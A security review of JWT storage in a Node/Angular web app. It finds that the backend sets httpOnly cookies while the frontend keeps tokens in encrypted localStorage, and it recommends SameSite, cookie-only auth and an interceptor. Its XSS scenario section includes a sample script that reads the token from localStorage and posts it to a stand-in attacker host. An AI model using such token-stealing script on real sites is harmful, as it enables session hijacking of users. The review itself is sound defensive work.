# Security Review: HttpOnly Cookies Implementation

**Date:** 2025-01-08
**Reviewer:** Security Analysis
**Focus:** JWT Storage and Authentication Security

---

## 🔍 Executive Summary

### Current Status: ⚠️ **PARTIALLY SECURE**

The backend **correctly implements httpOnly cookies**, but the frontend **is not using them**. Instead, the frontend stores JWT tokens in encrypted localStorage, which is vulnerable to XSS attacks.

### Risk Level: **MEDIUM-HIGH**

**Primary Vulnerability:** XSS (Cross-Site Scripting) can steal JWT tokens from localStorage

---

## 📊 Current Implementation Analysis

### ✅ Backend Implementation (GOOD)

**File:** `backend/controllers/authController.js:198-222`

```javascript
const sendTokenResponse = (user, statusCode, res) => {
  const token = user.generateAuthToken();

  const options = {
    expires: new Date(
      Date.now() + parseInt(process.env.JWT_COOKIE_EXPIRE) * 24 * 60 * 60 * 1000
    ),
    httpOnly: true  // ✅ GOOD: Prevents JavaScript access
  };

  if (process.env.NODE_ENV === 'production') {
    options.secure = true;  // ✅ GOOD: HTTPS only in production
  }

  res
    .status(statusCode)
    .cookie('token', token, options)
    .json({
      success: true,
      token,  // ❌ ISSUE: Also sends token in response body
      user: user.toJSON()
    });
};
```

**What's Good:**
- ✅ `httpOnly: true` - Cookie cannot be accessed by JavaScript
- ✅ `secure: true` in production - Cookie only sent over HTTPS
- ✅ Expiration set properly
- ✅ CORS credentials enabled (`credentials: true` in server.js:42)

**What's Missing:**
- ⚠️ **SameSite attribute not set** - Vulnerable to CSRF attacks
- ❌ **Token also sent in response body** - Frontend can store in localStorage

---

### ❌ Frontend Implementation (INSECURE)

**File:** `src/app/services/auth.service.ts`

**Current Approach:**
```typescript
// Stores user in encrypted localStorage
await this.secureStorage.setItem(this.USER_STORAGE_KEY, user);
```

**Issues:**
1. **Uses localStorage** - Accessible to JavaScript (XSS vulnerability)
2. **Doesn't use httpOnly cookies** - Backend cookies are ignored
3. **Encryption doesn't help against XSS** - Malicious script can access before encryption

**File:** `src/app/services/secure-storage.service.ts`

The SecureStorageService uses encrypted localStorage, which is better than plaintext but **still vulnerable to XSS**:

```typescript
async setItem(key: string, value: any): Promise<void> {
  const jsonString = JSON.stringify(value);
  const encrypted = await CryptoUtil.encrypt(jsonString, this.ENCRYPTION_KEY);
  localStorage.setItem(key, encrypted);  // ❌ Still uses localStorage
}
```

---

## 🚨 Security Vulnerabilities

### 1. XSS Attack Vector

**Scenario:**
```javascript
// Attacker injects malicious script
<script>
  // Can access localStorage even if encrypted
  const token = localStorage.getItem('currentUser');
  // Send to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: token
  });
</script>
```

**Impact:**
- Attacker can steal user session
- Impersonate user
- Access protected resources

### 2. Missing SameSite Protection

Without `SameSite` attribute, cookies are vulnerable to CSRF attacks.

### 3. Token Duplication

Token is sent in BOTH cookie and response body, creating two attack surfaces.

---

## ✅ Recommended Security Improvements

### Priority 1: CRITICAL - Remove Token from Response Body

**File:** `backend/controllers/authController.js:214-222`

**Current (Insecure):**
```javascript
res
  .status(statusCode)
  .cookie('token', token, options)
  .json({
    success: true,
    token,  // ❌ Remove this
    user: user.toJSON()
  });
```

**Recommended (Secure):**
```javascript
res
  .status(statusCode)
  .cookie('token', token, options)
  .json({
    success: true,
    // token removed - use cookie only
    user: user.toJSON()
  });
```

---

### Priority 2: CRITICAL - Add SameSite Attribute

**File:** `backend/controllers/authController.js:202-212`

**Current:**
```javascript
const options = {
  expires: new Date(
    Date.now() + parseInt(process.env.JWT_COOKIE_EXPIRE) * 24 * 60 * 60 * 1000
  ),
  httpOnly: true
};

if (process.env.NODE_ENV === 'production') {
  options.secure = true;
}
```

**Recommended:**
```javascript
const options = {
  expires: new Date(
    Date.now() + parseInt(process.env.JWT_COOKIE_EXPIRE) * 24 * 60 * 60 * 1000
  ),
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax',  // ✅ Add this
  path: '/'  // ✅ Explicit path
};
```

**SameSite Options:**
- `strict` - Best security, cookie never sent in cross-site requests
- `lax` - Good balance, cookie sent on top-level GET requests
- `none` - Least secure, requires `secure: true`

---

### Priority 3: HIGH - Update Frontend to Use Cookies

**Remove localStorage usage entirely**

**File:** `src/app/services/auth.service.ts`

**Current (Insecure):**
```typescript
login(email: string, password: string): Observable<any> {
  return this.http.post('/api/auth/login', { email, password }).pipe(
    tap(response => {
      // ❌ Stores token in localStorage
      localStorage.setItem('token', response.token);
    })
  );
}
```

**Recommended (Secure):**
```typescript
login(email: string, password: string): Observable<any> {
  return this.http.post('/api/auth/login',
    { email, password },
    { withCredentials: true }  // ✅ Send cookies with request
  ).pipe(
    tap(response => {
      // ✅ Don't store token - it's in httpOnly cookie
      // Just store user info (non-sensitive)
      this.currentUserSubject.next(response.user);
    })
  );
}
```

---

### Priority 4: HIGH - Configure HTTP Interceptor

**Create:** `src/app/interceptors/credentials.interceptor.ts`

```typescript
import { HttpInterceptorFn } from '@angular/common/http';

export const credentialsInterceptor: HttpInterceptorFn = (req, next) => {
  // Clone request and add withCredentials for API calls
  if (req.url.includes('/api/')) {
    const clonedRequest = req.clone({
      withCredentials: true  // Send httpOnly cookies
    });
    return next(clonedRequest);
  }
  return next(req);
};
```

**Add to `app.config.ts`:**
```typescript
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { credentialsInterceptor } from './interceptors/credentials.interceptor';

export const appConfig: ApplicationConfig = {
  providers: [
    provideRouter(routes),
    provideAnimations(),
    provideHttpClient(
      withInterceptors([credentialsInterceptor])  // ✅ Add interceptor
    )
  ]
};
```

---

## 📋 Implementation Checklist

### Backend Changes

- [ ] **Remove token from response body** (authController.js:219)
- [ ] **Add SameSite attribute to cookies** (authController.js:202-212)
- [ ] **Add path attribute** (explicitly set to '/')
- [ ] **Update logout to clear cookie properly**

### Frontend Changes

- [ ] **Remove all localStorage token storage**
- [ ] **Add withCredentials: true to HTTP calls**
- [ ] **Create credentials interceptor**
- [ ] **Remove SecureStorageService for auth tokens**
- [ ] **Keep only user info (non-sensitive) in memory**

### Testing

- [ ] **Verify cookies are set with httpOnly**
- [ ] **Verify cookies are sent with API requests**
- [ ] **Test logout clears cookies**
- [ ] **Test SameSite protection**
- [ ] **Verify no tokens in localStorage**

---

## 🔒 Complete Secure Implementation

### Backend: `authController.js`

```javascript
const sendTokenResponse = (user, statusCode, res) => {
  const token = user.generateAuthToken();

  const cookieOptions = {
    expires: new Date(
      Date.now() + parseInt(process.env.JWT_COOKIE_EXPIRE) * 24 * 60 * 60 * 1000
    ),
    httpOnly: true,  // Prevent JavaScript access
    secure: process.env.NODE_ENV === 'production',  // HTTPS only in prod
    sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax',  // CSRF protection
    path: '/'  // Available for all routes
  };

  res
    .status(statusCode)
    .cookie('token', token, cookieOptions)
    .json({
      success: true,
      // No token in response - use cookie only
      user: user.toJSON()
    });
};

// Logout - clear cookie properly
exports.logout = async (req, res, next) => {
  try {
    res.cookie('token', '', {
      httpOnly: true,
      expires: new Date(0),  // Expire immediately
      sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax',
      path: '/'
    });

    res.status(200).json({
      success: true,
      message: 'Logged out successfully'
    });
  } catch (error) {
    next(error);
  }
};
```

### Frontend: `auth.service.ts`

```typescript
import { HttpClient } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { BehaviorSubject, Observable } from 'rxjs';
import { tap } from 'rxjs/operators';
import { environment } from '../../environments/environment';

@Injectable({
  providedIn: 'root'
})
export class AuthService {
  private currentUserSubject = new BehaviorSubject<User | null>(null);
  currentUser$ = this.currentUserSubject.asObservable();

  constructor(private http: HttpClient) {
    this.checkAuth();
  }

  // Check if user is authenticated by calling /me endpoint
  checkAuth(): void {
    this.http.get<any>(`${environment.apiUrl}/auth/me`, {
      withCredentials: true  // Send httpOnly cookie
    }).subscribe({
      next: (response) => {
        this.currentUserSubject.next(response.data);
      },
      error: () => {
        this.currentUserSubject.next(null);
      }
    });
  }

  login(email: string, password: string): Observable<any> {
    return this.http.post<any>(
      `${environment.apiUrl}/auth/login`,
      { email, password },
      { withCredentials: true }  // Receive httpOnly cookie
    ).pipe(
      tap(response => {
        // Store only user info (not token)
        this.currentUserSubject.next(response.user);
      })
    );
  }

  logout(): Observable<any> {
    return this.http.post<any>(
      `${environment.apiUrl}/auth/logout`,
      {},
      { withCredentials: true }  // Clear httpOnly cookie
    ).pipe(
      tap(() => {
        this.currentUserSubject.next(null);
      })
    );
  }

  isAuthenticated(): boolean {
    return this.currentUserSubject.value !== null;
  }

  getCurrentUser(): User | null {
    return this.currentUserSubject.value;
  }
}
```

---

## 📊 Security Comparison

| Aspect | Current (localStorage) | Recommended (httpOnly) |
|--------|------------------------|------------------------|
| **XSS Protection** | ❌ Vulnerable | ✅ Protected |
| **CSRF Protection** | ✅ Not sent automatically | ⚠️ Needs SameSite |
| **JavaScript Access** | ❌ Accessible | ✅ Not accessible |
| **Storage Location** | Client (localStorage) | Client (httpOnly cookie) |
| **Encryption** | ✅ Encrypted | ✅ Not needed (httpOnly) |
| **Secure Transport** | ⚠️ HTTPS recommended | ✅ HTTPS enforced (secure flag) |
| **Auto-Sent with Requests** | ❌ Manual headers | ✅ Automatic (withCredentials) |

---

## 🎯 Recommendation

### Immediate Action Required

**Adopt httpOnly cookies for JWT storage.** The backend is already configured correctly, but the frontend needs updates to use the cookies instead of localStorage.

**Priority Order:**
1. **Remove token from backend response** (prevents localStorage storage)
2. **Add SameSite attribute** (CSRF protection)
3. **Update frontend to use withCredentials** (send/receive cookies)
4. **Remove localStorage token storage** (eliminate XSS vulnerability)

---

## 📚 Additional Resources

- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)
- [Auth0: Token Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

---

**Conclusion:** While the backend correctly implements httpOnly cookies, the frontend is not utilizing them. Implementing the recommended changes will significantly improve the application's security posture against XSS attacks.
